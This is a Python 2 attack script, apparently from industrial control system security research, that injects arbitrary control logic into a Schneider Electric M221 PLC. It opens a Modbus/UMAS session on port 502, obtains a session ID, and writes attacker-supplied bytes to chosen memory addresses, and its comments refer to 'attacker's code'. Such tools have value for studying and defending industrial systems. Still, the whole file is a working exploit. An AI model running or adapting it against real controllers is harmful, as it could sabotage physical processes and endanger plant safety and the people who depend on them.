import sys, os
import struct
import binascii
import socket
import argparse
import time
from random import randint

# M221 message (modbus payload after the function code) offset in TCP payload
M221_OFFSET = 8 
MODBUS_PORT = 502

M221_MAX_PAYLOAD_SIZE = 236
# Minimum size of m221 control logic which contains both input and ouput
MIN_CONTROL_LOGIC = 6

# Padding size can be configurable according to attacker's control logic
# 230 = M221_MAX_PAYLOAD_SIZE - MIN_CONTROL_LOGIC
FRONT_PADDING_SIZE = 230

# 235 = M221_MAX_PAYLOAD_SIZE - 1 (transfer one byte at a time)
BACK_PADDING_SIZE = 235

class M221_cl_injector():
    def __init__(self, targetIP):
        self.tranID = 1
        self.proto = '\x00\x00'
        self.len = 0
        self.unitID = '\x01'
        # Function code: Unity (Schneider) (90)
        self.fnc = '\x5a'

        self.m221_sid = '\x00'

        self.send_counter = 0

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((targetIP, MODBUS_PORT))

        self.set_m221_session_id()

        # (start addr, end addr, type) of each block
        self.conf1_info = ()
        self.conf2_info = ()
        self.code_info = ()
        self.data1_info = ()
        self.data2_info = ()
        self.zip_info = ()

    def send_recv_msg(self, modbus_data):
        self.send_counter += 1
        print "#", self.send_counter, "#"

        self.len = len(modbus_data) + len(self.unitID) + len(self.fnc)  
        tcp_payload = struct.pack(">H", self.tranID) + self.proto + struct.pack(">H", self.len) + self.unitID + self.fnc + modbus_data
        self.tranID = (self.tranID + 1) % 65536

        self.sock.send(tcp_payload)
        
        s = binascii.hexlify(tcp_payload)
        t = iter(s)
        print "--> " + ':'.join(a+b for a,b in zip(t,t)) + " (" + str(len(tcp_payload)) + ")"

        recv_buf = self.sock.recv(1000)
        r = binascii.hexlify(recv_buf)
        t = iter(r)
        print "<-- " + ':'.join(a+b for a,b in zip(t,t)) + " (" + str(len(recv_buf)) + ")"

        return recv_buf

    def close_socket(self):
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()

    def close_connection(self):
        modbus_data = self.m221_sid + '\x11'
        self.send_recv_msg(modbus_data)
        self.close_socket()

    def set_m221_session_id(self):
        sid_req_payload = '\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        self.m221_sid = self.send_recv_msg(sid_req_payload)[-1]
        print "m221 session id: " + binascii.hexlify(self.m221_sid)

    """
    def write_program(self):
        modbus_data = self.m221_sid + '\x29' + '\xb0\xe0\x01\x07\x06\x00\x7c\x2c\xfd\xe0\x2d\x02'

        self.send_recv_msg(modbus_data)
    """

    def write_mem(self, start_addr, data, data_size):
        max_data_unit = 236
        remained = data_size
        offset = 0
        addr = start_addr
        
        while (remained > 0):
            if remained >= max_data_unit:
                fragment_size = max_data_unit
            else:
                fragment_size = remained
            # write request: 0x29
            modbus_data = self.m221_sid + '\x29' + struct.pack("<I", addr) + struct.pack("<H", fragment_size) + data[offset:offset+fragment_size]
           # modbus_data = self.m221_sid + '\x29' + struct.pack("<I", addr) + struct.pack("<H", fragment_size) + '\xcc\xe0\x01\x0a'
            self.send_recv_msg(modbus_data)
            
            remained -= fragment_size
            addr += fragment_size
            offset += fragment_size

    """ 
        From firmware version 1.6.2.0
    """
    def get_write_permission(self):
        modbus_data = self.m221_sid + '\x80'
        self.send_recv_msg(modbus_data)

    def finish_task1(self):
        modbus_data = self.m221_sid + '\x81\x00\x00\x00\x00'
        self.send_recv_msg(modbus_data)
        
def main():
    parser = argparse.ArgumentParser(description="M221 Control Logic Injector")

    parser.add_argument("plc_ip", help="IP address of the target PLC")
    parser.add_argument("start_addr", help="start memory address to write the data")
    parser.add_argument("data", help="input file contains hex values to write")

    args = parser.parse_args()

    m221_injector = M221_cl_injector(args.plc_ip)
    start_addr = int(args.start_addr, 16)

    # read attacker's code
    f = open(args.data, "r")
    data = f.read()
    #data = binascii.unhexlify(f.read())

    data_size = len(data)
    f.close()

    print "\nData: " + binascii.hexlify(data) + "(size: " + str(data_size) + ")\n"
    

#    m221_injector.get_write_permission()
    m221_injector.write_mem(start_addr, data, data_size)
#    m221_injector.write_mem(0x0700d000, zip_data, zip_size)
#    m221_injector.write_mem(0x07044f48, conf2_data, conf2_size)
#    m221_injector.write_mem(0x200, data2_data, data2_size)
#    m221_injector.write_mem(0x0001fed4, conf1_data, conf1_size)
#    m221_injector.write_mem(0x1fed4+conf1_size-4, crc_data, crc_size)
#    m221_injector.finish_task1()   

    m221_injector.close_connection();

if __name__ == '__main__':
    main()

